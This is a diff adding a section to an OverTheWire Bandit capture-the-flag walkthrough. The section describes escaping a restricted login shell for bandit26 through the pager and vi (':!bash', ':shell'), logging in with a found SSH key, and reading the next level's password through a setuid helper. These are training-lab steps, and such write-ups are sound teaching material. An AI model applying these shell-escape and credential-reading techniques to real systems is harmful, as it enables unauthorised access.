@@ -320,3 +320,43 @@ The lab wants you to enter the password with a four digit pin.
    ```sh
    cat list.txt | nc localhost 30002
    ```
+## Escaping /usr/bin/bash shell to /bin/bash
+### **Steps to Solve**
+1. Check /etc/passwd
+   ```sh
+   grep bandit26 /etc/passwd
+   ```
+   ```ruby
+   bandit26:x:11026:11026::/home/bandit26:/usr/bin/showtext
+   ```
+2. Retrieve the private key for bandit26
+   ```sh
+   chmod 600 sshkey.private
+   ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey.private
+   ```
+3. Try resizing the terminal window in order to stop the showtext.
+4. Escaping showtext
+   ```sh
+   v
+   ```
+   Then try one of these
+   ```sh
+   :!bash
+   ```
+   or
+   ```sh
+   :!sh
+   ```
+   or
+   ```sh
+   :!set shell=/bin/bash
+   :shell
+   ```
+   or
+   ```sh
+   :!/bin/bash
+   ```
+5. Retrieving the password
+   ```sh
+   ./bandit27-do cat /etc/bandit_pass/bandit27
+   ```
